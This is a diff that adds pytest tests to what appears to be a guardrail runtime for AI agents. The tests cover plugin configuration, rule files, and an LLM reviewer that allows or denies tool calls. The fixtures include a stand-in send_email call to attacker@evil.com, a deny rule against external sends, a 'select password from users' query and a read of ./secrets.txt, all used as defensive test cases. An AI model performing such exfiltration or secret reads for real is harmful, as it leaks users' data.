@@ -4,11 +4,13 @@ import json
 
 import pytest
 
+from shared.rules.loader import load_rules_file
 from backend.runtime.plugins.base import BasePlugin, CheckResult
-from backend.runtime.plugins.manager import load_plugin_config
+from backend.runtime.plugins.manager import PluginManager, load_plugin_config
 from backend.runtime.plugins.registry import plugin_descriptions, register
 from backend.runtime.plugins.tool_before.rule_based_plugin import RuleBasedPlugin
 from backend.runtime.manager import RuntimeManager
+from backend.llm.provider import HeuristicProvider, OpenAICompatibleProvider, get_provider
 from shared.schemas.context import RuntimeContext
 from shared.schemas.events import EventType, RuntimeEvent
 from shared.schemas.policy import PolicyEffect, PolicyRule, RuleCondition
@@ -222,6 +224,55 @@ def test_server_registered_checker_can_be_loaded_by_name():
     )
 
 
+def test_server_plugin_config_binds_top_level_params_and_env(monkeypatch):
+    monkeypatch.setenv("TEST_SERVER_PLUGIN_API_KEY", "sk-test-server-plugin")
+    monkeypatch.setenv("TEST_SERVER_PLUGIN_MODEL", "gpt-test-server-plugin")
+
+    class ConfiguredServerPlugin(BasePlugin):
+        event_types = [EventType.TOOL_INVOKE]
+
+        def check(self, event, context, trajectory_window=None):
+            return CheckResult.empty()
+
+    mgr = PluginManager(
+        config={
+            "phases": {
+                "tool_before": {
+                    "client": [],
+                    "server": [
+                        {
+                            "plugin": ConfiguredServerPlugin,
+                            "threshold": 7,
+                            "kwargs": {"mode": "strict"},
+                            "env": {
+                                "api_key": "TEST_SERVER_PLUGIN_API_KEY",
+                                "model": "${TEST_SERVER_PLUGIN_MODEL}",
+                                "missing": "$TEST_SERVER_PLUGIN_MISSING",
+                                "literal": "literal-value",
+                            },
+                        }
+                    ],
+                }
+            }
+        }
+    )
+
+    plugin = mgr.plugins_by_phase["tool_before"][0]
+
+    assert plugin.threshold == 7
+    assert plugin.mode == "strict"
+    assert plugin.api_key == "sk-test-server-plugin"
+    assert plugin.model == "gpt-test-server-plugin"
+    assert plugin.missing is None
+    assert plugin.literal == "literal-value"
+    assert plugin.env == {
+        "api_key": "sk-test-server-plugin",
+        "model": "gpt-test-server-plugin",
+        "missing": None,
+        "literal": "literal-value",
+    }
+
+
 def test_manager_returns_plugin_result():
     m = RuntimeManager(
         plugin_config={
@@ -274,6 +325,342 @@ def test_manager_uses_plugin_config_file(tmp_path):
     res = m.decide(req)
     assert res["plugin_result"]["risk_signals"] == []
     assert "prompt_injection" not in res["risk_signals"]
+
+
+def test_manager_uses_rule_based_plugin_policy_env(tmp_path):
+    rules_path = tmp_path / "policy.rules"
+    rules_path.write_text(
+        json.dumps(
+            [
+                PolicyRule(
+                    rule_id="deny_external_send",
+                    effect=PolicyEffect.DENY,
+                    reason="Email send denied by configured policy",
+                    priority=90,
+                    event_types=["tool_invoke"],
+                    conditions=[RuleCondition(field="payload.tool_name", op="eq", value="send_email")],
+                ).to_dict()
+            ]
+        ),
+        encoding="utf-8",
+    )
+    m = RuntimeManager(
+        plugin_config={
+            "phases": {
+                "tool_before": {
+                    "client": [],
+                    "server": [
+                        {
+                            "name": "rule_based_plugin",
+                            "env": {
+                                "policy_path": str(rules_path),
+                            },
+                        }
+                    ],
+                }
+            }
+        }
+    )
+    req = {
+        "request_id": "rule-policy-env",
+        "context": {"session_id": "rule-policy-env"},
+        "current_event": {
+            "event_type": "tool_invoke",
+            "payload": {
+                "tool_name": "send_email",
+                "arguments": {"to": "attacker@evil.com"},
+                "capabilities": [],
+            },
+            "risk_signals": [],
+        },
+        "trajectory_window": [],
+        "local_signals": [],
+    }
+
+    res = m.decide(req)
+
+    assert res["decision"]["decision_type"] == "deny"
+    assert res["decision"]["reason"] == "Email send denied by configured policy"
+    assert any(rule.rule_id == "deny_external_send" for rule in m.policy.store.rules())
+
+
+def test_rule_based_plugin_exposes_llm_reviewer_config():
+    plugin = RuleBasedPlugin(
+        env={
+            "llm_backend": "openai",
+            "llm_model": "gpt-4o",
+            "llm_base_url": "https://example.test/v1",
+            "llm_api_key": "sk-rule-reviewer",
+            "llm_trace_max_steps": 5,
+        }
+    )
+
+    assert plugin.llm_reviewer_config() == {
+        "backend": "openai",
+        "model": "gpt-4o",
+        "base_url": "https://example.test/v1",
+        "api_key": "sk-rule-reviewer",
+        "trace_max_steps": 5,
+    }
+
+
+def test_llm_provider_prefers_explicit_checker_config(monkeypatch):
+    monkeypatch.setenv("AGENTGUARD_LLM_BASE_URL", "https://env.example/v1")
+    monkeypatch.setenv("AGENTGUARD_LLM_MODEL", "gpt-env")
+    monkeypatch.setenv("AGENTGUARD_LLM_API_KEY", "sk-env")
+
+    provider = get_provider(
+        config={
+            "backend": "openai",
+            "base_url": "https://checker.example/v1",
+            "model": "gpt-checker",
+            "api_key": "sk-checker",
+            "timeout_s": 12,
+        }
+    )
+
+    assert isinstance(provider, OpenAICompatibleProvider)
+    assert provider.base_url == "https://checker.example/v1"
+    assert provider.model == "gpt-checker"
+    assert provider.api_key == "sk-checker"
+    assert provider.timeout_s == 12
+
+
+def test_llm_provider_can_force_heuristic_from_checker_config(monkeypatch):
+    monkeypatch.setenv("AGENTGUARD_LLM_BASE_URL", "https://env.example/v1")
+
+    provider = get_provider(config={"backend": "heuristic"})
+
+    assert isinstance(provider, HeuristicProvider)
+
+
+def test_rules_file_llm_check_rule_loads_as_executable_rule(tmp_path):
+    rules_path = tmp_path / "review.rules"
+    rules_path.write_text(
+        "\n".join(
+            [
+                "RULE: review_sensitive_sql",
+                "ON: tool_call(database_query)",
+                'CONDITION: tool.sql MATCHES ".*password.*"',
+                "POLICY: LLM_CHECK",
+                'Prompt: "Return allow or deny based on sensitivity."',
+                'Reason: "review sensitive sql"',
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    rules = load_rules_file(rules_path)
+
+    assert len(rules) == 1
+    assert rules[0].metadata["review_kind"] == "llm_check"
+    assert rules[0].metadata["llm_prompt"] == "Return allow or deny based on sensitivity."
+    assert rules[0].conditions[0].field == "tool.sql"
+
+
+def test_example_rules_file_loads_without_condition_error():
+    rules = load_rules_file("rules/00_dsl_examples.rules")
+
+    assert len(rules) >= 10
+    assert any(rule.rule_id == "ex1-unconditional-deny" for rule in rules)
+
+
+def test_rule_based_plugin_llm_check_can_deny():
+    class FakeLLMClient:
+        def complete(self, prompt, **kwargs):
+            return '{"decision":"deny","reason":"Sensitive SQL should be denied."}'
+
+    plugin = RuleBasedPlugin(
+        rules_provider=lambda: [
+            PolicyRule(
+                rule_id="review_sensitive_sql",
+                effect=PolicyEffect.REQUIRE_REMOTE_REVIEW,
+                reason="Review sensitive SQL",
+                priority=60,
+                event_types=["tool_invoke"],
+                tool_names=["database_query"],
+                conditions=[RuleCondition(field="tool.sql", op="regex", value=".*password.*")],
+                metadata={
+                    "review_kind": "llm_check",
+                    "llm_prompt": "Decide allow or deny.",
+                },
+            )
+        ],
+        llm_client_factory=lambda config: FakeLLMClient(),
+    )
+    event = RuntimeEvent.from_dict(
+        {
+            "event_type": "tool_invoke",
+            "payload": {
+                "tool_name": "database_query",
+                "arguments": {"sql": "select password from users"},
+                "capabilities": [],
+            },
+            "risk_signals": [],
+        }
+    )
+
+    result = plugin.check(event, RuntimeContext(session_id="llm-review"))
+
+    assert result.is_final is True
+    assert result.decision_candidate is not None
+    assert result.decision_candidate.decision_type.value == "deny"
+    assert result.metadata["llm_reviewer"]["decision"] == "deny"
+
+
+def test_rule_based_plugin_llm_check_prompt_focuses_on_tool_arguments():
+    seen: dict[str, str] = {}
+
+    class FakeLLMClient:
+        def complete(self, prompt, **kwargs):
+            seen["prompt"] = prompt
+            return '{"decision":"allow","reason":"Reviewed the body payload."}'
+
+    plugin = RuleBasedPlugin(
+        rules_provider=lambda: [
+            PolicyRule(
+                rule_id="review_send_body",
+                effect=PolicyEffect.REQUIRE_REMOTE_REVIEW,
+                reason="Review outbound body",
+                priority=60,
+                event_types=["tool_invoke"],
+                tool_names=["send_http"],
+                metadata={
+                    "review_kind": "llm_check",
+                    "llm_prompt": "Check whether the outbound body contains sensitive information.",
+                },
+            )
+        ],
+        llm_client_factory=lambda config: FakeLLMClient(),
+    )
+    event = RuntimeEvent.from_dict(
+        {
+            "event_type": "tool_invoke",
+            "payload": {
+                "tool_name": "send_http",
+                "arguments": {"url": "https://example.com/upload", "body": "id:12345"},
+                "capabilities": [],
+            },
+            "risk_signals": [],
+        }
+    )
+    context = RuntimeContext(
+        session_id="llm-review",
+        user_id="alice",
+        agent_id="agent-1",
+        metadata={
+            "client_session_key": "sk-test-session-key",
+            "client_config_url": "http://127.0.0.1:38181/v1/client/plugins/config",
+            "custom": "keep-me",
+        },
+    )
+    trajectory = [
+        RuntimeEvent.from_dict(
+            {
+                "event_type": "llm_input",
+                "payload": {
+                    "messages": [
+                        {
+                            "input": [
+                                {"type": "human", "data": {"content": "send id:12345 to https://example.com/upload"}},
+                            ]
+                        }
+                    ]
+                },
+                "risk_signals": [],
+            }
+        ),
+        RuntimeEvent.from_dict(
+            {
+                "event_type": "tool_result",
+                "payload": {
+                    "tool_name": "read_local_file",
+                    "result": "safe preview for ./secrets.txt",
+                },
+                "risk_signals": ["secret_detected"],
+            }
+        ),
+    ]
+
+    result = plugin.check(event, context, trajectory)
+
+    assert result.decision_candidate is not None
+    assert result.decision_candidate.decision_type.value == "allow"
+    prompt = seen["prompt"]
+    assert "Current Call" in prompt
+    assert "Relevant Context" in prompt
+    assert "Recent Events" in prompt
+    assert '"body": "id:12345"' in prompt
+    assert '"custom": "keep-me"' in prompt
+    assert '"messages": [{"role": "user", "content": "send id:12345 to https://example.com/upload"}]' in prompt
+    assert '"tool_name": "read_local_file"' in prompt
+    assert '"result": "safe preview for ./secrets.txt"' in prompt
+    assert '"risk_signals": ["secret_detected"]' in prompt
+    assert "client_session_key" not in prompt
+    assert "sk-test-session-key" not in prompt
+    assert "client_config_url" not in prompt
+    assert "Current Event" not in prompt
+    assert "Trajectory Window" not in prompt
+
+
+def test_manager_uses_rules_file_llm_check_prompt(tmp_path):
+    rules_path = tmp_path / "review.rules"
+    rules_path.write_text(
+        "\n".join(
+            [
+                "RULE: review_sensitive_sql",
+                "ON: tool_call(database_query)",
+                'CONDITION: tool.sql MATCHES ".*password.*"',
+                "POLICY: LLM_CHECK",
+                'Prompt: "Directly allow or deny the tool call."',
+                'Reason: "review sensitive sql"',
+            ]
+        ),
+        encoding="utf-8",
+    )
+
+    class FakeLLMClient:
+        def complete(self, prompt, **kwargs):
+            assert "Directly allow or deny the tool call." in prompt
+            return '{"decision":"allow","reason":"Query is acceptable after review."}'
+
+    manager = RuntimeManager(
+        plugin_config={
+            "phases": {
+                "tool_before": {
+                    "client": [],
+                    "server": [
+                        {
+                            "name": "rule_based_plugin",
+                            "env": {"policy_path": str(rules_path)},
+                            "kwargs": {"llm_client_factory": lambda config: FakeLLMClient()},
+                        }
+                    ],
+                }
+            }
+        },
+        enable_session_health_monitor=False,
+    )
+
+    result = manager.decide(
+        {
+            "context": {"session_id": "rules-file-llm-check"},
+            "current_event": {
+                "event_type": "tool_invoke",
+                "payload": {
+                    "tool_name": "database_query",
+                    "arguments": {"sql": "select password from users"},
+                    "capabilities": [],
+                },
+                "risk_signals": [],
+            },
+            "trajectory_window": [],
+            "local_signals": [],
+        }
+    )
+
+    assert result["decision"]["decision_type"] == "allow"
+    assert result["plugin_result"]["metadata"]["llm_reviewer"]["decision"] == "allow"
 
 
 class StopsChainPlugin(BasePlugin):
